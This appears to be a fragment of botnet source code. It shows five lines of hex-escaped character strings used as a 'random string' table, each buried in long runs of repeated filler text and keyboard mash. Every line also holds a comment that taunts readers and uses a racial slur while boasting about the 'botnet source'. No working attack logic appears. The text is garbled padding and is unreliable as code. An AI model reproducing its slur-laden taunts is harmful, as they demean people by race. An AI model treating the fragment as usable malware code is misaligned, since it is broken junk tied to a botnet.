SHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x50","\x51","\x52","\x53","\x54","\x55","\x56",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x5e","\x5f","\x60","\x61","\x62","\x63","\x64",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x65","\x66","\x67","\x68","\x69","\x6a","\x6b",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
